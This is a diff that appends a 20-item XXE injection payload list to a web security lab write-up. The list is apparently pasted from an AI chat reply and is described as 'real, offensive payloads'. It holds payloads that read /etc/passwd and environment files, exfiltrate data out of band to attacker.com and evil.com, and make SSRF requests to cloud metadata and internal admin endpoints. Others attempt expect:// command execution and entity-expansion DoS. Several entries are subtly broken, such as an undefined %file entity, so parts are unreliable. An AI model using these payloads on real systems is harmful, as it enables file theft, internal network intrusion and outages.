@@ -829,3 +829,266 @@ We get requests in Burp Collaborator:
 
 
 ![img](images/7%20-%20Blind%20XXE%20with%20out-of-band%20interaction%20via%20XML%20parameter%20entities/2.png)
+
+Below is the **XXE – Complete Bypass Payload List**, written in the **same clean format** as your previous Host Header, CORS, SQL Injection formats.
+
+This contains **real, offensive payloads** used by pentesters.
+
+---
+
+# ⭐ **XXE Injection – Complete Bypass Payload List (Real Offensive Payloads)**
+
+---
+
+# **1. Basic External Entity Payloads**
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY x SYSTEM "file:///etc/passwd">
+]>
+<root>&x;</root>
+```
+
+---
+
+# **2. Classic File Read Bypass Payloads**
+
+```
+<!ENTITY x SYSTEM "file:///proc/self/environ">
+<!ENTITY x SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY x SYSTEM "file:///etc/hostname">
+```
+
+---
+
+# **3. Blind XXE Out-of-Band (OOB) Extraction**
+
+Used when file output is NOT returned in response.
+
+```
+<!ENTITY % d SYSTEM "http://attacker.com/xxe">
+<!ENTITY % xxe "<!ENTITY boom SYSTEM 'http://attacker.com/?p=%file;'>">
+%d; %xxe; &boom;
+```
+
+or a simpler one:
+
+```
+<!DOCTYPE foo [
+ <!ENTITY x SYSTEM "http://attacker.com/steal?x=/etc/passwd">
+]>
+<root>&x;</root>
+```
+
+---
+
+# **4. SSRF via XXE Payloads**
+
+```
+<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">
+<root>&x;</root>
+```
+
+Cloud metadata SSRF:
+
+```
+<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">
+<root>&x;</root>
+```
+
+---
+
+# **5. PHP Wrapper Injection Bypass**
+
+Read PHP source even with file restrictions:
+
+```
+<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<root>&x;</root>
+```
+
+---
+
+# **6. Java XXE with JAR Protocol**
+
+```
+<!ENTITY x SYSTEM "jar:file:///path/to/app.jar!/META-INF/MANIFEST.MF">
+```
+
+---
+
+# **7. Using `expect://` Wrapper (RCE on vulnerable PHP)**
+
+```
+<!ENTITY x SYSTEM "expect://id">
+<root>&x;</root>
+```
+
+---
+
+# **8. Gopher/FTP SSRF Bypass**
+
+```
+<!ENTITY x SYSTEM "gopher://127.0.0.1:25/_HELO%20evil.com">
+```
+
+```
+<!ENTITY x SYSTEM "ftp://anonymous:pass@evil.com/etc/passwd">
+```
+
+---
+
+# **9. Parameter Entity Expansion Bypass**
+
+```
+<!DOCTYPE foo [
+ <!ENTITY % a SYSTEM "file:///etc/passwd">
+ %a;
+]>
+```
+
+---
+
+# **10. Base64 Output Wrappers**
+
+```
+<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+```
+
+---
+
+# **11. XXE in SOAP Envelopes**
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope>
+  <soap:Body>&xxe;</soap:Body>
+</soap:Envelope>
+```
+
+---
+
+# **12. XXE in SVG Files**
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg>&xxe;</svg>
+```
+
+---
+
+# **13. XXE in DOCX / PPTX / ODT (ZIP-based)**
+
+Inject into `document.xml.rels`:
+
+```
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+
+Then reference:
+
+```
+Target="&xxe;"
+```
+
+---
+
+# **14. XXE with XML Parameter Entities (Bypass Restricted DOCTYPE)**
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [
+ <!ENTITY % ext SYSTEM "file:///etc/passwd">
+ <!ENTITY % trick "<!ENTITY file SYSTEM 'file:///etc/passwd'>">
+ %trick;
+]>
+<root>&file;</root>
+```
+
+---
+
+# **15. Broken Access Control + XXE Bypass**
+
+Access internal admin endpoints:
+
+```
+<!ENTITY x SYSTEM "http://localhost/admin?action=dump">
+```
+
+---
+
+# **16. Advanced Billion Laughs Attack (DoS)**
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY a "LOL">
+ <!ENTITY b "&a;&a;">
+ <!ENTITY c "&b;&b;">
+ <!ENTITY d "&c;&c;">
+]>
+<root>&d;</root>
+```
+
+---
+
+# **17. Nested/Recursive Entity Bypass**
+
+```
+<!ENTITY a "123">
+<!ENTITY b "&a;&a;&a;">
+<!ENTITY c "&b;&b;&b;">
+```
+
+---
+
+# **18. Whitespace/Control Character Bypass**
+
+```
+<!DOCTYPE foo [
+ <!ENTITY x SYSTEM " file:///etc/passwd">
+]>
+```
+
+or:
+
+```
+<!ENTITY x SYSTEM "file:///etc/passwd%00.jpg">
+```
+
+---
+
+# **19. Browser-Based XXE Payload (Old Browsers)**
+
+```
+<!DOCTYPE html [
+ <!ENTITY x SYSTEM "file:///etc/passwd">
+]>
+<html><body>&x;</body></html>
+```
+
+---
+
+# **20. XXE with Base URL Override**
+
+```
+<!DOCTYPE foo [
+  <!ENTITY % ext SYSTEM "http://evil.com/ext.dtd">
+  %ext;
+]>
+```
+
+Where `ext.dtd` contains:
+
+```
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+```
+
+---
